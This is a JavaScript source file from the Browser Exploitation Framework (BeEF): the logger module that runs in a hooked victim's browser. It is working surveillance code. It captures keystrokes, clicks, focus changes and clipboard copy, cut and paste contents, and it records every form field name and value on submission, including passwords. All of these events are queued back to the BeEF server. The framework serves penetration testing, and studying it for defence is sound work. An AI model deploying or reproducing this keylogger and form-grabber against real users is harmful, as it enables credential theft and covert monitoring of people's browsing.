//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.logger
 *
 * Provides logging capabilities.
 */
beef.logger = {
	
	running: false,
    /**
    * Internal logger id
    */
    id: 0,
	/**
	 * Holds events created by user, to be sent back to BeEF
	 */
	events: [],
	/**
	 * Holds current stream of key presses
	 */
	stream: [],
	/**
	 * Contains current target of key presses
	 */
	target: null,
	/**
	 * Holds the time the logger was started
	 */
	time: null,
    /**
    * Holds the event details to be sent to BeEF
    */
    e: function() {
        this.id = beef.logger.get_id();
        this.time = beef.logger.get_timestamp();
        this.type = null;
        this.x = 0;
        this.y = 0;
        this.target = null;
        this.data = null;
    },
	
	/**
	 * Starts the logger
	 */
	start: function() {

		beef.browser.hookChildFrames();
		this.running = true;
		var d = new Date();
		this.time = d.getTime();

		$j(document).keypress(
			function(e) { beef.logger.keypress(e); }
		).click(
			function(e) { beef.logger.click(e); }
		);
		$j(window).focus(
			function(e) { beef.logger.win_focus(e); }
		).blur(
			function(e) { beef.logger.win_blur(e); }
		);
		$j('form').submit(
			function(e) { beef.logger.submit(e); }
		);
		document.body.oncopy = function() {
			setTimeout("beef.logger.copy();", 10);
		};
		document.body.oncut = function() {
			setTimeout("beef.logger.cut();", 10);
		};
		document.body.onpaste = function() {
			beef.logger.paste();
		}
	},
	
	/**
	 * Stops the logger
	 */
	stop: function() {
		this.running = false;
		clearInterval(this.timer);
		$j(document).keypress(null);
	},

    /**
    * Get id
    */
    get_id: function() {
        this.id++;
        return this.id;
    },

	/**
	 * Click function fires when the user clicks the mouse.
	 */
	click: function(e) {
        var c = new beef.logger.e();
        c.type = 'click';
        c.x = e.pageX;
        c.y = e.pageY;
        c.target = beef.logger.get_dom_identifier(e.target);
        this.events.push(c);
	},
	
	/**
	 * Fires when the window element has regained focus
	 */
	win_focus: function(e) {
        var f = new beef.logger.e();
        f.type = 'focus';
        this.events.push(f);
	},
	
	/**
	 * Fires when the window element has lost focus
	 */
	win_blur: function(e) {
        var b = new beef.logger.e();
        b.type = 'blur';
		this.events.push(b);
	},
	
	/**
	 * Keypress function fires everytime a key is pressed.
	 * @param {Object} e: event object
	 */
	keypress: function(e) {
		if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0)))
		{
			beef.logger.push_stream();
			this.target = e.target;
		}
		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
	},
	
	/**
	 * Copy function fires when the user copies data to the clipboard.
	 */
	copy: function(x) {
		try {
			var c = new beef.logger.e();
			c.type = 'copy';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Cut function fires when the user cuts data to the clipboard.
	 */
	cut: function() {
		try {
			var c = new beef.logger.e();
			c.type = 'cut';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Paste function fires when the user pastes data from the clipboard.
	 */
	paste: function() {
		try {
			var c = new beef.logger.e();
			c.type = 'paste';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Submit function fires whenever a form is submitted
     * TODO: Cleanup this function
	 */
	submit: function(e) {
		try {
			var f = new beef.logger.e();
			var values = "";
			f.type = 'submit';
			f.target = beef.logger.get_dom_identifier(e.target);
			for (var i = 0; i < e.target.elements.length; i++) {
	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
	        }
			f.data = 'Action: '+$j(e.target).attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
			this.events.push(f);
		} catch(e) {}
	},
	
	/**
	 * Pushes the current stream to the events queue
	 */
	push_stream: function() {
		if (this.stream.length > 0)
		{
			this.events.push(beef.logger.parse_stream());
			this.stream = [];
		}
	},
	
	/**
	 * Translate DOM Object to a readable string
	 */
	get_dom_identifier: function(target) {
		target = (target == null) ? this.target : target;
		var id = '';
		if (target)
		{
			id = target.tagName.toLowerCase();
			id += ($j(target).attr('id')) ? '#'+$j(target).attr('id') : ' ';
			id += ($j(target).attr('name')) ? '('+$j(target).attr('name')+')' : '';
		}
		return id;
	},
	
	/**
	 * Formats the timestamp
	 * @return {String} timestamp string
	 */
	get_timestamp: function() {
		var d = new Date();
		return ((d.getTime() - this.time) / 1000).toFixed(3);
	},
	
	/**
	 * Parses stream array and creates history string
	 */
	parse_stream: function() {
		var s = '';
		for (var i in this.stream)
		{
			//s += (this.stream[i]['modifiers']['alt']) ? '*alt* ' : '';
			//s += (this.stream[i]['modifiers']['ctrl']) ? '*ctrl* ' : '';
			//s += (this.stream[i]['modifiers']['shift']) ? 'Shift+' : '';
			s += String.fromCharCode(this.stream[i]['char']);
		}
        var k = new beef.logger.e();
        k.type = 'keys';
        k.target = beef.logger.get_dom_identifier();
        k.data = s;
        return k;
	},
	
	/**
	 * Queue results to be sent back to framework
	 */
	queue: function() {
		beef.logger.push_stream();
		if (this.events.length > 0)
		{
			beef.net.queue('/event', 0, this.events);
			this.events = [];
		}
	}
		
};

beef.regCmp('beef.logger');
